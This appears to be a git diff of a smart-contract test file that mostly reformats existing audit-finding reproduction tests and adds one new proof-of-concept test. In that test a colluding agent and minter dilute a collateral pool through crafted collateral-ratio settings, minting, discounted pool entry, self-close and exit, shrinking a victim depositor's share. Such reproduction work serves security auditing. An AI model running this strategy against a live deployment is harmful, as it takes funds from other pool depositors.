@@ -285,7 +285,7 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
         console.log("poolCR after exploit: ", agentInfo.poolCollateralRatioBIPS);
     });
 
-    it("40760: agent frees collateral by double processing one redemption - original", async() => {
+    it("40760: agent frees collateral by double processing one redemption - original", async () => {
         // prepare an agent with collateral
         console.log(">> Prepare an agent with collateral");
         const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
@@ -501,7 +501,7 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
 
     });
 
-    it("41079: agent can increase underlying balance by constructing a negative-value redemption payment UTXO", async() => {
+    it("41079: agent can increase underlying balance by constructing a negative-value redemption payment UTXO", async () => {
 
         const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
         const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(10000));
@@ -587,21 +587,21 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
         const txHash = await minter.performMintingPayment(crt);
         const minted = await minter.executeMinting(crt, txHash);
 
-        await context.assetManager.announceAgentSettingUpdate(agent.agentVault.address, "handshakeType", 1, {from: agentOwner1});
+        await context.assetManager.announceAgentSettingUpdate(agent.agentVault.address, "handshakeType", 1, { from: agentOwner1 });
         // agentFeeChangeTimelockSeconds: 21600
         // skip time to execute change of setting
         await deterministicTimeIncrease(6 * 3600 + 1);
         mockChain.skipTime(6 * 3600 + 12);
-        mockChain.mine((6*3600/12) + 1);
-        await context.assetManager.executeAgentSettingUpdate(agent.agentVault.address, "handshakeType", {from: agentOwner1});
+        mockChain.mine((6 * 3600 / 12) + 1);
+        await context.assetManager.executeAgentSettingUpdate(agent.agentVault.address, "handshakeType", { from: agentOwner1 });
 
         // Make a redemption request to agent's owned address
         await context.fAsset.transfer(redeemer.address, minted.mintedAmountUBA, { from: minter.address });
-        const [redemptionRequests,,,] = await redeemer.requestRedemption(lots);
+        const [redemptionRequests, , ,] = await redeemer.requestRedemption(lots);
         const request = redemptionRequests[0];
 
         // Reject redemption so that it cannot be confirmed by any proof of payment
-        await context.assetManager.rejectRedemptionRequest(request.requestId, {from: agentOwner1});
+        await context.assetManager.rejectRedemptionRequest(request.requestId, { from: agentOwner1 });
 
         // Assume no one is taking over
 
@@ -616,7 +616,7 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
         // Agent waits for 14 days
         await deterministicTimeIncrease(15 * DAYS + 10);
         mockChain.skipTime(14 * DAYS + 10);
-        mockChain.mine(100*14);
+        mockChain.mine(100 * 14);
 
         // perform double payment to the same payment reference
         const tx2Hash = await agent.performPayment(request.paymentAddress, paymentAmount, request.paymentReference);
@@ -639,8 +639,8 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
         // Agent deposits 1e18 of wNat via enter method
         await agent.buyCollateralPoolTokens(toBNExp(1, 18));
         // Agent directly transfers wNat to collateral pool (large portion)
-        await context.wNat.deposit({value: fullPoolCollateral.sub(toBNExp(1,18)), from: agentOwner1});
-        await context.wNat.transfer(agent.collateralPool.address, fullPoolCollateral.sub(toBNExp(1,18)), {from: agentOwner1});
+        await context.wNat.deposit({ value: fullPoolCollateral.sub(toBNExp(1, 18)), from: agentOwner1 });
+        await context.wNat.transfer(agent.collateralPool.address, fullPoolCollateral.sub(toBNExp(1, 18)), { from: agentOwner1 });
 
         await agent.makeAvailable();
         await context.updateUnderlyingBlock();
@@ -889,4 +889,59 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
         await expectRevert(challenger.illegalPaymentChallenge(agent, tx2Hash), 'matching redemption active');
         await expectRevert(challenger.doublePaymentChallenge(agent, tx1Hash, tx2Hash), 'verified transaction too old');
     });
+
+    it("47020: agent dilutes collateral pool by setting topup CR below pool minting CR", async () => {
+
+        async function userPoolCollateral(user: string): Promise<BN> {
+            const userTokens = await agent.collateralPoolToken.balanceOf(user)
+            const tokens = await agent.collateralPoolToken.totalSupply()
+            const collateral = await agent.collateralPool.totalCollateral()
+            return userTokens.mul(collateral).div(tokens)
+        }
+
+        // define minter and agent with malicious settings (for simplicity, assume they are collaborating)
+        const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(1000000));
+        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1, {
+            poolFeeShareBIPS: 0,
+            mintingPoolCollateralRatioBIPS: 20_000,
+            poolTopupCollateralRatioBIPS: 30_000,
+            poolExitCollateralRatioBIPS: 30_001,
+            poolTopupTokenPriceFactorBIPS: 9500
+        });
+
+        // Make agent available and deposit some collateral
+        // NOTE: wei of vault collateral should be priced higher than wei of pool for this test
+        const fullAgentCollateral = toWei(3e8);
+        await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
+        // update block, passing agent creation block
+        await context.updateUnderlyingBlock();
+
+        // victim enters agent's collateral pool
+        const victim = accounts[81]
+        await agent.collateralPool.enter(0, false, { from: victim, value: fullAgentCollateral })
+        const victimNatBefore = await userPoolCollateral(victim)
+
+        // ---- start malicious strategy (can be iterated) -----
+
+        // perform minting for all free lots to drop agent CR to mintingPoolCollateralRatioBIPS < poolTopupCollateralRatioBIPS
+        const freeLots = (await agent.getAgentInfo()).freeCollateralLots
+        await minter.performMinting(agent.agentVault.address, freeLots)
+        // minter enters the collateral pool to buy tokens
+        const tx = await agent.collateralPool.enter(0, false, { from: minter.address, value: fullAgentCollateral })
+        const receivedPoolTokens = toBN(requiredEventArgs(tx, "Entered").receivedTokensWei)
+        // the agent self-closes minter's FAssets to raise the CR
+        await context.fAsset.transfer(agent.ownerWorkAddress, context.convertLotsToUBA(freeLots), { from: minter.address })
+        await agent.selfClose(context.convertLotsToUBA(freeLots))
+        // agent waits for the collateral pool token timelock to expire and exits
+        await deterministicTimeIncrease(context.settings.collateralPoolTokenTimelockSeconds)
+        await agent.collateralPool.exit(receivedPoolTokens, 0, { from: minter.address })
+
+        // ---- end malicious strategy (can be iterated) -----
+
+        // check that victim had collateral pool native balance stolen
+        const victimNatAfter = await userPoolCollateral(victim)
+        console.log('victim balance before:', victimNatAfter.toString())
+        console.log('victim balance after :', victimNatBefore.toString())
+        assert(victimNatAfter.lt(victimNatBefore))
+    })
 });
